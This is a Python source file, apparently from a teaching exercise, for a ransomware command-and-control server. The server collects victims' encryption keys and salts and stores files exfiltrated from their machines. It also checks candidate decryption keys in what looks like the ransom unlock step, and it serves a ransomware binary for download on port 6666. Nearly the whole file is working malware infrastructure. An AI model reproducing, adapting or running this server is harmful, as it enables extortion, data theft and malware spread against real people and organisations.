import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from requests import Response


from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC/"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)


    """
        Function raise when the HTTP server receive a
        POST request on the URI /new
    """
    def post_new(self, path:str, params:dict, body:dict)->dict:
        
        os.makedirs(CNC.ROOT_PATH, exist_ok=True)

        # Decode the values
        token = base64.b64decode(body["token"])
        salt = base64.b64decode(body["salt"])
        key = base64.b64decode(body["key"])

        # Print the key for fast uncrypt
        print("\n\nKEY "+token.hex()[0:10]+"... : ", 
                str(base64.b64encode(key), encoding="utf-8"))

        # Create folder token
        folder_token_name = CNC.ROOT_PATH + str(token.hex())
        os.makedirs(folder_token_name, exist_ok=True)

        with open(folder_token_name + "/key.bin", "wb") as f:
            f.write(key)

        with open(folder_token_name + "/salt.bin", "wb") as f:
            f.write(salt)

        return {"status":"KO"}

    """
        Function raise when the HTTP server receive a
        POST request on the URI /files
    """
    def post_files(self, path:str, params:dict, body:dict)->dict:

        # Obtain the token for authentificated the client
        token = base64.b64decode(body["token"])

        # Obtain the keys in the dictionnary
        # The keys correspond to the file's path in the client computer
        key = list(body.keys())

        # Create folder for saving the files 
        # in the corresponding folder
        path = CNC.ROOT_PATH + token.hex() + "/files/"
        os.makedirs(path,  exist_ok=True)

        path = path + "file_"


        # Save the leaks files
        # In this example, just the first one
        # Use len(body) in the range function
        # for saving all the files
        for i in range(1,2):
            name_file = path + str(i) +".txt"
            with open(name_file, "w+") as f:

                f.write(key[i] + "\n\n")
                f.write(body[key[i]])

        return {}

    # Encode binary to base64
    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")
    

    """
        Function raise when the HTTP server receive a
        POST request on the URI /key
        This function is used for the key verification step
    """
    def post_key(self, path:str, params:dict, body:dict)->dict:

        # Obtain the token for authentificated the client
        token = base64.b64decode(body["token"])

        folder_token_name = CNC.ROOT_PATH + token.hex() # str(m.hexdigest())
        file_path = folder_token_name + "/key.bin"
        
         # Obtain the candidate key from the client
        key_rcv = base64.b64decode(body["key"])

        try:
            f = open(file_path, "rb")
            key = f.read()
        except: # Token error
            return {"valide":-1} 
        f.close()

        # Key verification
        if(key_rcv == key):

            return {"valide": 1}

        return {"valide": 0}
    
    def get_malware(self, path:str, params:dict, body:dict)->dict:
        payload = {}
        path = CNC.ROOT_PATH + "bin/ransomware"
        with open(path, "rb") as f:
            payload["malware"] = self.bin_to_b64(f.read())
        
        return payload

httpd = HTTPServer(('0.0.0.0', 6666), CNC)
print("Httpd starting...")
httpd.serve_forever()